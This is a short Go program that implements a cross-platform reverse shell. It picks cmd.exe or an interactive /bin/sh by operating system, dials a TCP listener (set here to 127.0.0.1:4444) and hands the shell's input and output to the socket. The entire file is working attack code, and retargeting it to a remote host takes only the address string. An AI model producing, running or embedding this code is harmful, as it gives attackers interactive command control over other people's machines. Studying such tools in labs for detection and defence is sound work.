package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	targetAddr := "127.0.0.1:4444" // local host

	fmt.Printf("[*] Detecting operating system...\n")
	var shell string
	var args []string

	switch runtime.GOOS {
	case "windows":
		fmt.Println("[*] Platform detected: Windows")
		shell = "cmd.exe"
		args = []string{}
	case "linux", "darwin":
		fmt.Printf("[*] Platform detected: %s\n", runtime.GOOS)
		shell = "/bin/sh"
		args = []string{"-i"}
	default:
		fmt.Printf("[-] Error: Unsupported OS: %s\n", runtime.GOOS)
		return
	}

	fmt.Printf("[*] Attempting to connect to listener at %s...\n", targetAddr)

	conn, err := net.DialTimeout("tcp", targetAddr, 10*time.Second)
	if err != nil {
		fmt.Printf("[-] Connection failed: %v\n", err)
		return
	}
	defer func() {
		conn.Close()
		fmt.Println("[*] Connection closed successfully.")
	}()

	fmt.Printf("[+] Successfully connected to %s!\n", conn.RemoteAddr().String())
	fmt.Printf("[*] Spawning shell process (%s)...\n", shell)

	cmd := exec.Command(shell, args...)

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	fmt.Println("[*] Shell session active. Handing control over to network socket...")

	err = cmd.Run()
	if err != nil {
		fmt.Printf("[-] Shell execution error or session terminated: %v\n", err)
		return
	}

	fmt.Println("[+] Shell process exited cleanly.")
}
